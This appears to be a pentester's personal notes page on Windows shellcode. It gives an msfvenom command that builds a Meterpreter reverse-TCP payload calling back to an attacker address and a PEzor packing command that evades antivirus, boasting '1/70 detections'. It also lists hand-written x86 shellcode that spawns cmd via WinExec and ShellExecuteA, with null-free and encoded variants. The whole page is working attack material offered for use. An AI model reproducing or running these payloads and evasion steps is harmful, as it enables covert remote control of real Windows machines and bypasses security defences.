# Shellcode Notes

## [⬅ Back to Index](../README.md)

The following are my helpful short opcodes to open Command Prompt for testing against vulnerable apps.

### Reference

* [1] <https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow>

### Links

* [Helpful Opcode Chemistry table](http://sparksandflames.com/files/x86InstructionChart.html)

---

## FUD packer by phra - PEzor

### Build venom payload to connect back to our shell

* `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.150.114 LPORT=8081 -o /opt/lol64 --format raw`

### Run phra's packer

* PEzor located here: <https://github.com/phra/PEzor>
* `bash PEzor/PEzor.sh -64 -sgn -text -syscalls -sleep=42 lol64`

### 1/70 detections on Virustotal

Run the exe on our Win 10 target by any means.

Boom, full meterpreter via multihandler!

---

## Raw shellcode

### Win32 - WinExec(A,B) w/ SW_HIDE

```asm
33c0        ; Clear out eAX
50          ; Use "0" for (B) of winexec if we just want the smallest shellcode
            ; "0" from eAX will be equivalent to SW_HIDE constant [1].
68636d6400  ; Push "cmd" (A)
8bcc        ; Mov ecx,esp
53          ; Push eBX (B)
51          ; Push eCX (A)
b86ef47875  ; My location of winexec(A,B) in kernel32 DLL, ASLR will change this on every boot.
ffd0        ; Call eAX (fire!)

Full:
\x33\xc0\x50\x68\x63\x6d\x64\x00\x8b\xcc\x53\x51\xb8\x6e
\xf4\x78\x75\xff\xd0

Null-free:
\x33\xdb\xbb\x52\x5c\x53\xef\x81\xc3\x11\x11\x11\x11\x53
\x8b\xdc\x33\xc0\x50\x53\xb8\x6e\xf4\x78\x75\xff\xd0

SGN Encoded (single round):
\xba\x20\x8e\xae\xc7\xd9\xe8\xd9\x74\x24\xf4\x5e\x2b\xc9
\xb1\x05\x31\x56\x15\x83\xc6\x04\x03\x56\x11\xe2\xd5\xbd
\x6e\x97\x7d\xa1\x03\x7c\x7d\xae\x10\x2f\x2c\x08\xc6\x24
\xb6\x1d\xe8\x15
```

### Win32 - ShellExecuteA w/ SW_SHOW

#### Issue: may require vulnerable app to have shell32 DLL loaded, check with procexp

```asm
68636d6400  ; push "cmd"
8bdc        ; Mov ebx, esp
6a00        ; Push nullbyte to end "open" string
686f70656e  ; Push "open"
8bcc        ; Mov ecx, esp
6a05        ; Push "5" for SW_SHOW constant [1].
33c0        ; Xor eax with itself (0 it out)
50          ; Push eax (null, or "0")
50          ; Push eax
53          ; Push ebx
51          ; Push ecx
50          ; Push eax
b8c0877a76  ; My location of ShellExecuteA(x,x,x,x,x,x) in shell32 DLL, ASLR will change this on every boot.
ffd0        ; Call eax

Full:
\x68\x63\x6d\x64\x00\x8b\xdc\x6a\x00\x68\x6f\x70\x65\x6e\x8b\xcc\x6a\x05\x33\xc0\x50\x50\x53\x51\x50\xb8\xc0\x87\x7a\x76\xff\xd0
```
